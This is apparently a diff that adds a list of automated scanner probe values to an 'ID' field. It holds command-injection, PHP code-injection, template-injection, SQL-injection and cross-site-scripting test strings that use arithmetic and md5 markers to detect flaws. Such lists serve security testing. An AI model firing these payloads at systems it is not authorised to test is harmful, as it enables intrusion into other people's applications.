@@ -1,0 +1,28 @@
+ID:12
+ID:12
+expr 980141047 + 915938766
+
+ID:12|expr 951040607 + 968073073 
+ID:12$(expr 985903082 + 822474676)
+ID:12&set /A 996871124+926162888
+ID:${@var_dump(md5(197351720))};
+ID:\'-var_dump(md5(784030102))-\'
+ID:/*1*/{{915291262+964111326}}
+ID:${975510697+910857026}
+ID:${(889932121+865764807)?c}
+ID:#set($c=957269429+987830592)${c}$c
+ID:<%- 800508158+809188042 %>
+ID:12
+ID:12
+ID:12
+ID:12\'and/**/extractvalue(1,concat(char(126),md5(1164790474)))and\'
+ID:12\"and/**/extractvalue(1,concat(char(126),md5(1284780934)))and\"
+ID:extractvalue(1,concat(char(126),md5(1457586749)))
+ID:12\'and(select\'1\'from/**/cast(md5(1836054347)as/**/int))>\'0
+ID:12/**/and/**/cast(md5(\'1855845684\')as/**/int)>0
+ID:convert(int,sys.fn_sqlvarbasetostr(HashBytes(\'MD5\',\'1834029750\')))
+ID:12\'and/**/convert(int,sys.fn_sqlvarbasetostr(HashBytes(\'MD5\',\'1810739918\')))>\'0
+ID:12鎈\'\"\\(
+ID:epvxupnvxxqrpqxxzufr
+ID:<ofvkcwdxfm>
+ID:<ScRiPt>ofvkcwdxfm</sCrIpT>
